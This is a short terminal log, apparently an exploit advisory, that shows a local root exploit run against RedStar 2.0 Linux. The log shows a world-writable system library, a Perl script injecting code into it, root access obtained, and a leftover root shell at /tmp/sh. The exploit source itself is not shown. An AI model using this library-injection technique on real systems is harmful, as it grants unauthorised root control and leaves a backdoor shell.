

#               N.Korea RedStar 2.0 Linux local root exploit

                                               - 2012.03.30

 [user@RedStar2 ~]$ uname -a
 Linux RedStar2 2.6.25-14.rs2.0.i686 1 SMP Fri Jul 24 19:10:00 KST 2009 i686 i686 i386 GNU/Linux
 [user@RedStar2 ~]$ ls -al /lib/libresolv-2.5.so
 -rwxrwxrwx 1 root root 74612 4?? 1 07:08 /lib/libresolv-2.5.so
 [user@RedStar2 ~]$ rpm -qf /lib/libresolv-2.5.so
 glibc-2.5-3.rs2.0
 [user@RedStar2 ~]$ id
 uid=500(user) gid=500(user) groups=500(user)
 [user@RedStar2 ~]$ ./rs-linux-local-root.pl
 RedStar 2.0 Linux (N.Korea) root exploit

 [*] Preparing for the attack...
 [-] Checking '/lib/libresolv-2.5.so' file... yes!
 [-] Checking '/bin/ping' file... yes!
 [-] Checking '/usr/bin/bzip2' file... yes!
 [*] Spawn a compressed evil binary.
 [*] Uncompressing a evil binary.
 [*] Create a root shell: /tmp/sh
 [*] Backup the original library.
 [*] Inject evil code into library...
 [*] Do Exploit.........
 [*] Exploit successfully!
 [root@RedStar2 user] id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 [root@RedStar2 user] exit
 exit
 [*] Cleanup!
 [*] A ROOT SHELL IS '/tmp/sh'. DELETE IT YOURSELF!
 [user@RedStar2 ~]$ 
